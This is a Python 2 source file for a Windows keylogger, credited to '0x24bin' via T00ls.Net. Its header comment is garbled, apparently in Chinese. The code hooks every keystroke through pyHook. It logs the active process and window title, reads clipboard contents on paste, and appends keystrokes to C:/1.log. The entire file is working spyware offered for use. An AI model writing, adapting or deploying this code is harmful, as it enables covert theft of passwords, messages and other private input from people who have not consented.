#��Pythonʵ�ֵļ��̼�¼�����ܺ���
#��������ǰĳ����Ե�ɺ��£�д�����ļ��̼�¼����С�˶Ա�����Բ���Ϥ����Python�Ƚ��죬����Python��PyHook pythoncom win32clipboard ʵ����������̼�¼������Windows7���Կ��У���ʱ������һ����æ�������ó����ʹ�ҷ���,�������Լ�ؼ��̣����ҿ��Ի�ȡ���а�����
#coding: utf-8
#author: 0x24bin
# By T00ls.Net
from ctypes import *
import pyHook
import pythoncom
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
myFile = "C:/1.log"
def  save_file(msga):
    fp = open(myFile,'a')
    fp.writelines(msga)  
    fp.writelines("\r\n")  
    fp.close()      


def get_current_process():
    # get top window
    hwnd = user32.GetForegroundWindow()

    # get process PID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # put PID in  process_id
    process_id = "%d" % pid.value

    # create mem
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # read windows title 
    windows_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 512)

    # print 
    print
    print "[ PID:%s-%s-%s]" % (process_id, executable.value,    windows_title.value)
    print
    save_file("PID:"+process_id+"    "+executable.value)
    save_file(windows_title.value)
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# define sub 
def KeyStroke(event):
    global current_window

 
    if event.WindowName != current_window:
        current_window = event.WindowName

        get_current_process()


    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
        save_file(chr(event.Ascii))
    else:

        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE]-%s" % (pasted_value),
        else:
            print "[%s]" % event.Key,
            save_file(event.Key)

    return True

# create hook 
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke


kl.HookKeyboard()
pythoncom.PumpMessages()
